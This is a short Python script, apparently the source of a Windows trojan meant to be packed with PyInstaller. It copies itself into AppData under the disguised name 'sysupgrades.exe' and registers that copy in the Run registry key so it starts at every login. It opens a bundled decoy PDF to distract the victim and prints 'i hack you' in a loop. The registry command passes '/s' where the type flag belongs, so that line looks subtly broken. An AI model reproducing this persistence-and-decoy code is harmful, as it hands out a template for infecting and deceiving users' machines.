
import time
import subprocess
import os
import shutil # for copying file
import sys # for getting current working exe

def add_to_registry():
    new_file = os.environ["Appdata"] + "\\sysupgrades.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable,new_file)
        reg_edit = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /s REG_SZ /d " + new_file
        subprocess.call(reg_edit,shell=True)
    
add_to_registry()

def open_added_file():
    added_file = sys._MEIPASS + "\\metallical.pdf"
    subprocess.Popen(added_file,shell=True)

open_added_file()
x = 0
while x < 100:
	print("i hack you")
	x += 1
	time.sleep(0.5)
# subprocess.check_output("command", shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
